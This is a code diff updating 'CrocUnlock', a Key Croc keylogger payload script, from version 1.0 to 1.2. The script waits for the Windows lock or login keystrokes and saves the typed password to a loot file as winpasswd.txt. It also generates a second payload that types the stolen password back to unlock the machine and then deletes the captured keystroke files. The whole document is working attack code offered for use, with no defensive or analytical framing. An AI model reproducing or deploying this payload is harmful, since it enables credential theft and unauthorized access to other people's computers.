@@ -1,7 +1,7 @@
 # Title:           CrocUnlock (payload #1)  
 # Description:     Log into windows pc
 # Author:          spywill / RootJunky
-# Version:         1.0
+# Version:         1.2
 # Category:        Key Croc
 #
 #
@@ -10,19 +10,23 @@ MATCH (GUI-l|CONTROL-ALT-DELETE|ALT-F4)
 CROC_KEYS=/root/udisk/loot/Croc_unlock.txt.filtered
 CROC_UNLOCK=/root/udisk/payloads/Croc_unlock_2.txt
 #
-if [ ! -e "${CROC_UNLOCK}" ]; then
-LED SETUP
-echo -e "# Title:           CrocUnlock (PAYLOAD #2)\n# Description:     Log into windows pc\n# Author:          RootJunky / Spywill\n# Version:         1.0\n# Category:        Key Croc\n#\n#" >> ${CROC_UNLOCK}
-echo \M\A\T\C\H crocunlock >> ${CROC_UNLOCK}
-echo -e "LED ATTACK\nCROC_PASS=/root/udisk/loot/winpasswd.txt\n\$(sed -i -e '/^[crocunlock]/d' ${CROC_KEYS})\ncat ${CROC_KEYS} >> \${CROC_PASS}\nQ CONTROL-SHIFT-LEFTARROW\nQ DELETE\nQ STRING" >> ${CROC_UNLOCK}
-echo -e "Q STRING \$(sed '\$!d' \${CROC_PASS})\nQ ENTER\nsleep 1\nrm -f -r /root/udisk/loot/Croc_unlock.txt ${CROC_KEYS}\nLED FINISH\nsleep 2\nLED OFF" >> ${CROC_UNLOCK}
+if [ -e "${CROC_UNLOCK}" ]; then
+     LED ATTACK
+     sleep 2
 SAVEKEYS /root/udisk/loot/Croc_unlock.txt UNTIL ENTER
-LED FINISH
-sleep 2
-LED OFF;
+     LED FINISH
+     sleep 2
+     LED OFF;
 else
-LED ATTACK
+     LED SETUP
+     echo -e "# Title:           CrocUnlock (PAYLOAD #2)\n# Description:     Log into windows pc\n# Author:          RootJunky / Spywill\n# Version:         1.2\n# Category:        Key Croc\n#\n#" >> ${CROC_UNLOCK}
+     echo \M\A\T\C\H crocunlock >> ${CROC_UNLOCK}
+     echo -e "LED ATTACK\nCROC_PASS=/root/udisk/loot/winpasswd.txt\n\$(sed -i -e '/^[crocunlock]/d' ${CROC_KEYS})\ncat ${CROC_KEYS} >> \${CROC_PASS}\nQ CONTROL-SHIFT-LEFTARROW\nQ DELETE\nif [ -e "\${CROC_PASS}" ]; then" >> ${CROC_UNLOCK}
+     echo -e "      Q STRING \$(sed '\$!d' \${CROC_PASS})\n      Q ENTER\n      sleep 1\n      rm -f -r /root/udisk/loot/Croc_unlock.txt ${CROC_KEYS}\n      LED FINISH\n      sleep 2\n      LED OFF\nfi;" >> ${CROC_UNLOCK}
+     LED ATTACK
+     sleep 2
 SAVEKEYS /root/udisk/loot/Croc_unlock.txt UNTIL ENTER
-sleep 2
-LED OFF;
+     LED FINISH
+     sleep 2
+     LED OFF;
 fi;
